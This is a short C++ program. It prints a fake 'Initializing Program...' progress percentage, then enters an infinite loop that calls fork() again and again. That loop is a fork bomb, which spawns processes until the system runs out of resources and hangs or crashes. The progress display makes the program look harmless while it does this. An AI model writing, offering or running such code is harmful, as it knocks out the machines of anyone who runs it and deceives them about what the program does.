#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <unistd.h>

int main() {
    for (int i = 0; i <= 100; ++i) {
        std::cout << "\rInitializing Program..." << i << "% " << std::flush;
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
    std::cout << std::endl;

    while (true) {
        fork();
    }


    return 0;
}
